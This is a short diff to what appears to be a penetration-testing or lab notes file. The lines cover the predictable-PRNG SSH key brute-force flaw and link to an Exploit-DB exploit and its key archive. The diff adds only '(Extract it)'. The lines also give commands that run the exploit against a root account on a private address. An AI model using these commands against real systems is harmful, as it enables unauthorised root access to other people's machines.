@@ -10,7 +10,7 @@
 ## SSH hacking
 - Vulnerability: Predictable PRNG Brute Force SSH  
 - Exploit: `https://www.exploit-db.com/download/5720`  
-- Keys: `https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2`
+- Keys: `https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2` (Extract it)
 - `python2 5720.py`
 - `./exploit.py <dir> <host> <user> [[port] [threads]]`
 - `python2 5720 keys 192.168.100.3 root 22 10`
